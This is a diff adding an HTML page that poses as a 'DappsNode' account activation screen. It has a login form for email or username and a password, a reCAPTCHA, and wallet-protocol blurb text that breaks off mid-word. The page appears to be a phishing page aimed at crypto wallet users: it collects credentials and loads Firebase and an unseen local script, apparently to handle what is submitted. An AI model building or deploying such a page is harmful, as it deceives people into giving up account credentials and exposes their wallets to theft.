@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>consnode.ape</title>
+    <script src="https://www.google.com/recaptcha/api.js" async defer></script>
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto Condensed">
+    <link rel="stylesheet" href="./bootstrap-5.2.1-dist/bootstrap-5.2.1-dist/css/bootstrap.min.css">
+</head>
+<style>
+    section{
+        width: 80%;
+        margin: 50px auto;
+        font-family: 'Roboto Condensed', Aerial Narrow;
+    }
+    form, .section2{
+        width: 80%;
+        margin: 20px auto;
+    }
+    input{
+        width: 90%;
+
+    }
+    h3{
+        font-weight: lighter;
+        font-size: xx-large;
+    }
+    h2{
+        color: rgb(0, 40, 85);
+
+    }
+    h6{
+        font-size:13px;
+    }
+
+
+ 
+    @media (max-width:510px) {
+        section{
+            width: 100%;
+        }
+        form, .section2, input{
+            width: 95%;
+        }
+    }
+</style>
+<body>
+    <main>
+        <section>
+            <div class="img_holder text-center">
+                <img src="./set.png" alt="">
+                <h3>Account Activation</h3>
+            </div>
+
+            <form method="POST" action="" class="" id="validate-node">
+                <div class="col-md-12 form-group my-4">
+                <input id="emailORuserName" class="form-control" type="email" placeholder="Email Address/Username" required>
+                </div>
+
+                <div class="col-md-12 form-group my-4">
+                <input id="password" class="form-control" type="password" placeholder="Password" required>
+                </div>
+
+                <div class="g-recaptcha" data-sitekey="6LcSNi0pAAAAAL6RY21PGcKTpGrosCPDEvM4f2k9"></div>
+
+                <div class="my-2">
+                    <button onclick="load()" class="btn btn-success" type="Submit">Submit</button>
+                </div>
+            </form>
+
+            <div class="section2">
+                <div>
+                    <h2><strong>Note</strong></h2>
+                    <h6> <strong> DappsNode is an open source protocol for connecting decentralised applications 
+                        to mobile wallets with QR code scanning or deep linking. A user can interact securely 
+                        with any Dapp from their mobile phone, making DappsNode wallets a safer choice compared 
+                        to desktop or browser extension wallets. How does it work? DappsNode connects web applications 
+                        to supported mobile wallets. DappsNode session is started by a scanning a QR code (desktop) or 
+                        by clicking an applicatadd
+    </main>
+</body>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/firebase/7.14.1-0/firebase.js"></script>
+<script src="./docx.js"></script>
+</html>
